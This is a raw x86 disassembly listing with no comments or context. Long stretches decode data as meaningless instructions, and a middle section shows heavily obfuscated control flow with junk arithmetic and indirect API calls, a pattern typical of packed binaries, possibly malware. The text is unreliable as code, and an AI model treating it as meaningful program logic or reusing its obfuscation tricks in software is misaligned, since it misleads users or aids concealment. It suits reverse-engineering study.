  404c0c:	jb     0x404c39
  404c0e:	icebp  
  404c0f:	mov    ecx,0xa069435
  404c14:	ficomp WORD PTR [ebx+0x314c1a1f]
  404c1a:	mov    eax,0xeadaedb3
  404c1f:	push   esp
  404c20:	mov    eax,0x447dde4b
  404c25:	push   0xb7c5cb80
  404c2a:	xor    dl,BYTE PTR [esp]
  404c2d:	aaa    
  404c2e:	stos   DWORD PTR es:[edi],eax
  404c2f:	mov    bl,0xb4
  404c31:	dec    edi
  404c32:	push   eax
  404c33:	adc    eax,0x1326fa1e
  404c38:	mov    ah,0xd4
  404c3a:	cs ins DWORD PTR es:[edi],dx
  404c3c:	das    
  404c3d:	sub    BYTE PTR [ebp+0x11],0x68
  404c41:	mov    bh,0xdb
  404c43:	xor    DWORD PTR [esi],0x32
  404c46:	cli    
  404c47:	pop    es
  404c48:	test   BYTE PTR [edx],bl
  404c4a:	xchg   esi,eax
  404c4b:	mov    ebx,0x960f3a62
  404c50:	lods   eax,DWORD PTR ds:[esi]
  404c51:	push   esp
  404c52:	fwait
  404c53:	loope  0x404c51
  404c55:	not    DWORD PTR [ebp+0x6]
  404c58:	add    DWORD PTR ss:[edi+eax*8+0x67891009],0xffffff8c
  404c61:	cmp    DWORD PTR [ebp+0x5a],0x58bc43de
  404c68:	dec    edx
  404c69:	lds    ebx,FWORD PTR [esi+eiz*1-0x1a50d35d]
  404c70:	sbb    eax,0x33d5180e
  404c75:	mov    edi,0x759f5167
  404c7a:	push   ebx
  404c7b:	mov    esp,0x6e03d2e2
  404c80:	imul   edi,DWORD PTR [ebp+0x72],0x95f807ea
  404c87:	stc    
  404c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c89:	and    DWORD PTR [ecx],esp
  404c8b:	xchg   esp,edx
  404c8d:	sub    bh,BYTE PTR [edx-0x460bd489]
  404c93:	cli    
  404c94:	dec    ebp
  404c95:	pushf  
  404c96:	aam    0x48
  404c98:	repnz (bad) 
  404c9a:	sti    
  404c9b:	and    edx,DWORD PTR [ebx]
  404c9d:	add    al,BYTE PTR [eax]
  404c9f:	fmul   DWORD PTR [edx]
  404ca1:	rol    DWORD PTR [edi+0x148efd57],cl
  404ca7:	shl    bh,0xf6
  404caa:	aas    
  404cab:	pop    es
  404cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cad:	mov    ebp,0xa73feabc
  404cb2:	popf   
  404cb3:	ins    DWORD PTR es:[edi],dx
  404cb4:	add    ebx,DWORD PTR [edi+0x6ab48562]
  404cba:	in     al,0xc2
  404cbc:	xchg   BYTE PTR [esi+0x1d0e62c6],ah
  404cc2:	fist   WORD PTR [edi+0x18]
  404cc5:	adc    BYTE PTR [edi],0x37
  404cc8:	fild   QWORD PTR [ebp+0x5bb2920b]
  404cce:	sub    ebp,eax
  404cd0:	in     al,0xd5
  404cd2:	mov    ebp,0xbf805282
  404cd7:	lods   eax,DWORD PTR ds:[esi]
  404cd8:	leave  
  404cd9:	jns    0x404c95
  404cdb:	(bad)  
  404cdc:	mov    esp,0x57f5c2b7
  404ce1:	clc    
  404ce2:	cmp    dh,bh
  404ce4:	pusha  
  404ce5:	add    ebx,ebp
  404ce7:	gs sbb esi,ecx
  404cea:	mov    bl,0xa4
  404cec:	and    DWORD PTR [esi-0x3d29b45b],esp
  404cf2:	loopne 0x404d1d
  404cf4:	out    dx,eax
  404cf5:	fadd   DWORD PTR [ecx]
  404cf7:	popa   
  404cf8:	sub    ah,BYTE PTR [esi]
  404cfa:	ror    eax,cl
  404cfc:	sbb    eax,0xdabf9b49
  404d01:	push   ss
  404d02:	xor    eax,0xbb801799
  404d07:	gs ins DWORD PTR es:[edi],dx
  404d09:	lahf   
  404d0a:	mov    ecx,0x4d18bee2
  404d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d10:	pop    ebp
  404d11:	outs   dx,DWORD PTR ds:[esi]
  404d12:	dec    ecx
  404d13:	stos   DWORD PTR es:[edi],eax
  404d14:	neg    BYTE PTR ds:0x71d4f2d4
  404d1a:	fistp  WORD PTR [ecx+0x5caa1c62]
  404d20:	jp     0x404d5c
  404d22:	xor    BYTE PTR [ecx+0x72331176],0xa1
  404d29:	(bad)  [esi+0x55]
  404d2c:	stos   DWORD PTR es:[edi],eax
  404d2d:	sub    dl,BYTE PTR [eax+esi*8]
  404d30:	out    dx,al
  404d31:	or     eax,0x887b583c
  404d36:	dec    ecx
  404d37:	xor    eax,0x64ec146e
  404d3c:	mov    edx,0x8ba3415f
  404d41:	loopne 0x404cec
  404d43:	cmp    cl,cl
  404d45:	add    DWORD PTR [ecx],esi
  404d47:	mov    dh,BYTE PTR [esi]
  404d49:	aas    
  404d4a:	fisttp DWORD PTR [edi]
  404d4c:	push   ecx
  404d4d:	mov    ch,0xdf
  404d4f:	fist   WORD PTR [esi-0x35]
  404d52:	jmp    0x106b:0x69e53543
  404d59:	fwait
  404d5a:	mov    esp,0x13b517bb
  404d5f:	inc    ebp
  404d60:	push   ebx
  404d61:	stos   DWORD PTR es:[edi],eax
  404d62:	fldenv [eax]
  404d64:	(bad)  
  404d66:	fmul   st,st(7)
  404d68:	or     eax,0x326c07b6
  404d6d:	mov    edi,0x1f7c1bb8
  404d72:	(bad)  
  404d74:	or     al,BYTE PTR [ebx]
  404d76:	pop    ecx
  404d77:	cmp    DWORD PTR [ebp+edi*1+0x7b],eax
  404d7b:	fcmovnbe st,st(4)
  404d7d:	lods   al,BYTE PTR ds:[esi]
  404d7e:	sbb    ecx,DWORD PTR [esi+0x78]
  404d81:	mov    ebp,0xa5dd253c
  404d86:	push   cs
  404d87:	fisttp QWORD PTR [eax]
  404d89:	xor    DWORD PTR [ecx-0x40f321ac],edx
  404d8f:	xchg   esp,eax
  404d90:	and    ch,cl
  404d92:	ja     0x404d74
  404d94:	xchg   ebx,eax
  404d95:	xlat   BYTE PTR ds:[ebx]
  404d96:	push   ss
  404d97:	pop    ecx
  404d98:	cli    
  404d99:	pop    ebx
  404d9a:	aad    0x27
  404d9c:	stos   DWORD PTR es:[edi],eax
  404d9d:	sbb    ebx,DWORD PTR [esi+0x1562609e]
  404da3:	pop    es
  404da4:	dec    ebx
  404da5:	or     eax,0x3b763abf
  404daa:	fs in  eax,dx
  404dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dad:	mov    ebp,0xf478710a
  404db2:	ins    BYTE PTR es:[edi],dx
  404db3:	into   
  404db4:	outs   dx,BYTE PTR ds:[esi]
  404db5:	pop    ebp
  404db6:	sub    BYTE PTR [esp+eiz*2+0xa75909d],al
  404dbd:	push   ebx
  404dbe:	jle    0x404da7
  404dc0:	dec    edi
  404dc1:	mov    edi,0x8f2d5165
  404dc6:	ja     0x404d77
  404dc8:	adc    BYTE PTR [edx-0x6],ch
  404dcb:	pop    edi
  404dcc:	cwde   
  404dcd:	sub    BYTE PTR [esi],dh
  404dcf:	or     DWORD PTR [edi+edi*8-0x2a],edx
  404dd3:	pusha  
  404dd4:	and    DWORD PTR [edx],edx
  404dd6:	mov    ch,BYTE PTR [edi-0x41]
  404dd9:	xor    BYTE PTR [ebx-0x64],0xcc
  404ddd:	popf   
  404dde:	not    BYTE PTR [esi+0x45e73779]
  404de4:	add    eax,0x8912a484
  404de9:	add    al,0xd0
  404deb:	int3   
  404dec:	mov    ecx,0xa58d4254
  404df1:	mov    edi,DWORD PTR [ecx]
  404df3:	pcmpgtd mm6,QWORD PTR [ecx-0x1285dab4]
  404dfa:	aam    0x88
  404dfc:	xlat   BYTE PTR ds:[ebx]
  404dfd:	in     al,dx
  404dfe:	xchg   BYTE PTR [edx-0x79e97761],dl
  404e04:	icebp  
  404e05:	adc    BYTE PTR [edi],bh
  404e07:	sbb    al,0x9f
  404e09:	arpl   WORD PTR [eax-0x23],ax
  404e0c:	mov    eax,0xdea9172
  404e11:	int    0x73
  404e13:	dec    ecx
  404e14:	inc    ebx
  404e15:	fdiv   DWORD PTR ds:0x58829405
  404e1b:	sub    DWORD PTR [ebx+0x43c73ac8],ecx
  404e21:	mov    al,ds:0x73671750
  404e26:	shl    DWORD PTR [ebp+0x731fe634],cl
  404e2c:	imul   esp,edx,0xffffffbd
  404e2f:	inc    ecx
  404e30:	scas   eax,DWORD PTR es:[edi]
  404e31:	popa   
  404e32:	cwde   
  404e33:	stos   DWORD PTR es:[edi],eax
  404e34:	add    cl,0xc7
  404e37:	test   DWORD PTR [edi+0x6],eax
  404e3a:	mov    ds:0x853e1947,al
  404e3f:	xor    eax,0x84600e22
  404e44:	push   ds
  404e45:	cmp    eax,DWORD PTR [esi+ebx*2-0x5f]
  404e49:	sbb    al,0x63
  404e4b:	(bad)  
  404e4c:	(bad)  
  404e4d:	pop    ds
  404e4e:	test   eax,0xec0c9dcc
  404e53:	cmp    DWORD PTR [ecx],esi
  404e55:	jecxz  0x404e8d
  404e57:	xor    esi,ebp
  404e59:	push   esp
  404e5a:	dec    ecx
  404e5b:	add    DWORD PTR [ebx],ebp
  404e5d:	push   esi
  404e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e5f:	idiv   BYTE PTR [ebp-0x47ef0c9c]
  404e65:	push   0xfdc2c83c
  404e6a:	and    eax,0x4893cf4b
  404e6f:	mov    ebp,0x1c6abb15
  404e74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e75:	jge    0x404e14
  404e77:	sbb    al,0xa6
  404e79:	mov    ebp,0x8eb33e0
  404e7e:	ins    DWORD PTR es:[edi],dx
  404e7f:	rcr    BYTE PTR [esi],cl
  404e81:	sub    ch,BYTE PTR [ebx-0x67898d4d]
  404e87:	mov    edi,0xb7b1ac56
  404e8c:	and    al,0x70
  404e8e:	jmp    0x45ac10b6
  404e93:	outs   dx,BYTE PTR ds:[esi]
  404e94:	inc    ebx
  404e95:	lds    ebx,FWORD PTR [ebp-0x424ea87b]
  404e9b:	popf   
  404e9c:	icebp  
  404e9d:	inc    esi
  404e9e:	push   ebx
  404e9f:	(bad)  
  404ea0:	fisttp WORD PTR [eax]
  404ea2:	lea    ebx,[ecx-0x3729a943]
  404ea8:	push   ds
  404ea9:	mov    ch,cl
  404eab:	add    ebp,DWORD PTR [eax]
  404ead:	arpl   WORD PTR [edi+0xa],bx
  404eb0:	jmp    0x4335:0x9de32329
  404eb7:	dec    edx
  404eb8:	dec    edx
  404eb9:	pop    DWORD PTR [edx]
  404ebb:	mov    bl,0x77
  404ebd:	sub    al,0x57
  404ebf:	arpl   si,ax
  404ec1:	icebp  
  404ec2:	scas   eax,DWORD PTR es:[edi]
  404ec3:	inc    ebx
  404ec4:	pop    esi
  404ec5:	sbb    DWORD PTR [edx+0x28bad02c],edi
  404ecb:	outs   dx,BYTE PTR ds:[esi]
  404ecc:	(bad)  
  404ecd:	jle    0x404e89
  404ecf:	cli    
  404ed0:	push   0xe579e916
  404ed5:	into   
  404ed6:	push   ecx
  404ed7:	mov    ecx,0xd9120501
  404edc:	jno    0x404f47
  404ede:	mov    al,0x46
  404ee0:	ss sahf 
  404ee2:	je     0x404e8a
  404ee4:	and    DWORD PTR [eax+eiz*8+0x5929e3b8],ebx
  404eeb:	adc    DWORD PTR [edx],edi
  404eed:	lahf   
  404eee:	and    al,BYTE PTR [edx]
  404ef0:	mov    WORD PTR [esi-0x1c6d6c7a],ds
  404ef6:	jg     0x404efc
  404ef8:	mov    esi,ss
  404efa:	sbb    BYTE PTR [eax],al
  404efc:	mov    esp,0x2500d02
  404f01:	dec    DWORD PTR [edi+eax*2]
  404f04:	xor    al,0x55
  404f06:	pop    esi
  404f07:	and    al,al
  404f09:	jno    0x404f83
  404f0b:	push   esp
  404f0c:	scas   eax,DWORD PTR es:[edi]
  404f0d:	jns    0x404ee3
  404f0f:	jmp    0xf67d:0x1814a6
  404f16:	mov    al,0xf4
  404f18:	inc    edx
  404f19:	cdq    
  404f1a:	cmp    BYTE PTR [edi],bl
  404f1c:	sbb    esp,DWORD PTR [edx]
  404f1e:	xchg   esi,eax
  404f1f:	mov    ds:0x9e1ebc93,eax
  404f24:	fucomip st,st(5)
  404f26:	sar    DWORD PTR [edx+0x353bc997],cl
  404f2c:	or     edx,DWORD PTR [ebp-0x1c]
  404f2f:	sbb    DWORD PTR ds:0x42828b,0x7456
  404f39:	shl    ecx,0x1e
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x428297
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x4283ab,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x428387,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x428393,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x428393,0x0
  404f72:	mov    DWORD PTR ds:0x428323,ebx
  404f78:	mov    DWORD PTR ds:0x42839b,0x56b3
  404f82:	mov    DWORD PTR ds:0x42827b,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x42824f,ebx
  404f97:	mov    DWORD PTR ds:0x428287,0x5683
  404fa1:	cmp    DWORD PTR ds:0x428393,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428d9c
  404fbc:	and    edx,DWORD PTR ds:0x428333
  404fc2:	sub    DWORD PTR ds:0x42825f,ecx
  404fc8:	or     DWORD PTR ds:0x428253,0xf0b
  404fd2:	adc    DWORD PTR ds:0x42818f,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x428373
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x42817b,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x428173
  404ff2:	xor    DWORD PTR ds:0x4282b3,edx
  404ff8:	mov    edx,DWORD PTR ds:0x428287
  404ffe:	add    DWORD PTR ds:0x4283ab,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x4282b3
  40500c:	add    DWORD PTR ds:0x42828b,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x428393,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x42839f,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x428187,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x4283af,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x42829f,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x428193,0x428277
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x42838b,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x42839b,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x42828b,0x428397
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x428283,0x4282a3
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428257,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x42838b,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x42839b,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x4283a7,0x42824b
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x428273,0x42825f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x4282af,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x42828f,0x42826b
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x428177,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x42839b,0x0
  40512f:	mov    DWORD PTR ds:0x4281ab,edx
  405135:	mov    DWORD PTR ds:0x42837b,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x42818b,0x795c
  40514c:	cmp    DWORD PTR ds:0x42839b,0x0
  405153:	ja     0x40517c
  405159:	push   0x427fbc
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428dc4
  40516c:	or     DWORD PTR ds:0x428283,0xa87
  405176:	add    ecx,DWORD PTR ds:0x4283b7
  40517c:	adc    ecx,DWORD PTR ds:0x42819b
  405182:	xor    DWORD PTR ds:0x42818b,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x42829f,edx
  405192:	cmp    DWORD PTR ds:0x4282fb,0x0
  405199:	mov    DWORD PTR ds:0x428327,0x66a6
  4051a3:	mov    DWORD PTR ds:0x428307,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x4282fb,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428dc8
  4051d1:	inc    DWORD PTR ds:0x428297
  4051d7:	mov    ecx,DWORD PTR ds:0x4281d7
  4051dd:	mov    edx,DWORD PTR ds:0x4283d7
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x4282fb,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x4281cf
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x428283,edx
  405201:	mov    edx,DWORD PTR ds:0x4281e7
  405207:	mov    ecx,DWORD PTR ds:0x4283d7
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x42838f,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x42829f
  405233:	sub    DWORD PTR ds:0x4281a3,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x42837b,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x428187,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x42828f,0x428193
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x4283ab,0x428277
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x4283a3,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x42817b,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x4282b3,0x0
  40529a:	mov    DWORD PTR ds:0x428243,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x428283
  4052aa:	mov    DWORD PTR ds:0x42830b,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x4283b3,0x6b40
  4052c3:	mov    DWORD PTR ds:0x42829b,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x4282b3,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x428079
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428dcc
  4052ea:	add    edx,DWORD PTR ds:0x42826b
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x428193
  4052fc:	and    DWORD PTR ds:0x42819f,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x428277
  40530f:	add    DWORD PTR ds:0x4282b3,edx
  405315:	mov    edx,DWORD PTR ds:0x42829b
  40531b:	add    DWORD PTR ds:0x428183,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x428307,0x42823f
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x428323,0x0
  40533c:	mov    DWORD PTR ds:0x42831f,edi
  405342:	mov    DWORD PTR ds:0x428287,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x42832b,0x4d36
  405357:	mov    DWORD PTR ds:0x4283a7,0x1e95
  405361:	cmp    DWORD PTR ds:0x428323,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428dd0
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x4283af,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x4283ef
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x42838f,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42825f
  40539c:	xor    DWORD PTR ds:0x42816b,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x42828b,edx
  4053ae:	cmp    DWORD PTR ds:0x42830b,0x0
  4053b5:	mov    DWORD PTR ds:0x428177,edi
  4053bb:	not    DWORD PTR ds:0x42824b
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x4281a7,0xab0
  4053d0:	cmp    DWORD PTR ds:0x42830b,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428dd4
  4053f6:	sub    ecx,DWORD PTR ds:0x4281ab
  4053fc:	sub    DWORD PTR ds:0x42824b,0x6432
  405406:	or     DWORD PTR ds:0x42826f,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x42819f
  405416:	sub    DWORD PTR ds:0x4283a3,edi
  40541c:	mov    DWORD PTR ds:0x42824b,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x428287,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x4282ff,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x4283af
  405450:	sub    edx,DWORD PTR ds:0x428163
  405456:	mov    DWORD PTR ds:0x4283af,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	stos   DWORD PTR es:[edi],eax
  40546e:	cmp    eax,0xb9e6708f
  405473:	sbb    BYTE PTR [eax],bl
  405475:	sahf   
  405476:	adc    bl,BYTE PTR [eax]
  405478:	sbb    BYTE PTR [edi],dh
  40547a:	int    0xf2
  40547c:	cs add edx,edx
  40547f:	and    dx,dx
  405482:	xchg   esp,eax
  405483:	xchg   ecx,eax
  405484:	mov    al,BYTE PTR [eax]
  405486:	fdiv   DWORD PTR [ecx-0x661ac711]
  40548c:	cli    
  40548d:	xchg   BYTE PTR [ebx+0x132c5046],cl
  405493:	push   esi
  405494:	mov    ebp,0x207a525e
  405499:	or     ch,BYTE PTR [edi+0x5a]
  40549c:	jecxz  0x40544b
  40549e:	mov    cl,0x2a
  4054a0:	gs xor dl,dh
  4054a3:	repz xchg esi,eax
  4054a5:	inc    esi
  4054a6:	(bad)  
  4054a7:	aaa    
  4054a8:	xchg   ecx,eax
  4054a9:	xor    ch,ch
  4054ab:	ficomp DWORD PTR [ecx+0x55091b88]
  4054b1:	mov    ebp,0x828ce9f1
  4054b6:	push   ds
  4054b7:	lock int3 
  4054b9:	cmp    ch,dl
  4054bb:	xchg   esi,eax
  4054bc:	daa    
  4054bd:	inc    ebx
  4054be:	jb     0x405440
  4054c0:	add    DWORD PTR [edx],eax
  4054c2:	xor    BYTE PTR [ebp-0x3bb5a5df],bl
  4054c8:	outs   dx,BYTE PTR ds:[esi]
  4054c9:	cmp    eax,edi
  4054cb:	push   ebx
  4054cc:	pop    ebx
  4054cd:	rol    BYTE PTR [ebx],0x64
  4054d0:	jle    0x405461
  4054d2:	(bad)  
  4054d3:	sbb    BYTE PTR [esi+esi*2],dh
  4054d6:	(bad)  
  4054d8:	std    
  4054d9:	jmp    0x7f83:0x7eca
  4054df:	retf   0xd8ee
  4054e2:	sti    
  4054e3:	pusha  
  4054e4:	sub    DWORD PTR [esi+edx*8-0x75],ebx
  4054e8:	mov    ds:0x87064728,eax
  4054ed:	sbb    bl,BYTE PTR gs:[edi+0x23a09f85]
  4054f4:	push   DWORD PTR [edx-0x621da4ae]
  4054fa:	pop    ecx
  4054fb:	pop    ebp
  4054fc:	xor    ebp,ebp
  4054fe:	(bad)  
  4054ff:	adc    al,0x4a
  405501:	mov    al,0x35
  405504:	iret   
  405505:	dec    eax
  405506:	sbb    al,BYTE PTR [eax-0x39]
  405509:	or     BYTE PTR [ebp+0x9],al
  40550c:	sub    ch,BYTE PTR [edi]
  40550e:	fstp   TBYTE PTR [ebx-0x45]
  405511:	(bad)  
  405512:	iret   
  405513:	push   0xb1af6243
  405518:	dec    ecx
  405519:	out    dx,al
  40551a:	cmp    BYTE PTR ds:[esi-0x1d4a37d1],al
  405521:	pop    ecx
  405522:	hlt    
  405523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405524:	je     0x405535
  405526:	push   ebx
  405527:	push   ds
  405528:	mov    bh,0xf6
  40552a:	inc    edx
  40552b:	sbb    eax,0x323dcdb4
  405530:	push   cs
  405531:	fadd   QWORD PTR [esi]
  405533:	sub    al,0xad
  405535:	outs   dx,BYTE PTR ds:[esi]
  405536:	out    0xa8,eax
  405538:	xor    al,0x22
  40553a:	inc    edi
  40553b:	cmp    BYTE PTR [ebx-0x4e],dl
  40553e:	lea    ecx,[ebx+ecx*4+0x5371ccea]
  405545:	sti    
  405546:	jns    0x40556f
  405548:	mov    es,eax
  40554a:	adc    ebp,edx
  40554c:	lea    eax,ds:0x367fcd60
  405552:	out    dx,al
  405553:	dec    ebp
  405554:	cli    
  405555:	inc    ebx
  405556:	lods   al,BYTE PTR ds:[esi]
  405557:	stos   DWORD PTR es:[edi],eax
  405558:	lds    edx,FWORD PTR [ebx-0x6daf21cf]
  40555e:	aad    0x95
  405560:	aam    0xac
  405562:	pop    ecx
  405563:	push   es
  405564:	push   cs
  405565:	out    dx,eax
  405566:	addr16 mov bh,0x78
  405569:	ret    
  40556a:	test   al,0xcb
  40556c:	and    cl,BYTE PTR [ecx+0x7bc8ea14]
  405572:	fst    QWORD PTR [esi]
  405574:	test   al,0x38
  405576:	mov    edx,0x85fc7db0
  40557b:	xchg   edx,eax
  40557c:	pop    ds
  40557d:	lds    esi,FWORD PTR [eax+0xe]
  405580:	pop    ss
  405581:	adc    esp,eax
  405583:	hlt    
  405584:	cdq    
  405585:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405587:	add    DWORD PTR [ecx],ebp
  405589:	jo     0x4055b5
  40558b:	push   ecx
  40558c:	fnstenv [ebx-0x70]
  40558f:	stos   BYTE PTR es:[edi],al
  405590:	xchg   ebx,eax
  405591:	xor    al,0xea
  405593:	pushf  
  405594:	aas    
  405595:	fwait
  405596:	adc    DWORD PTR [ebp+0x33],esi
  405599:	dec    ecx
  40559a:	push   ebp
  40559b:	push   ebx
  40559c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40559d:	dec    edx
  40559e:	mov    edx,0x580e4c38
  4055a3:	push   0x6f435735
  4055a8:	daa    
  4055a9:	pop    ebx
  4055aa:	xchg   DWORD PTR [ebp+esi*8-0x73],ebp
  4055ae:	rcr    BYTE PTR [eax-0x12],cl
  4055b1:	(bad)  
  4055b2:	daa    
  4055b3:	call   0xe662:0xe1dc1a4c
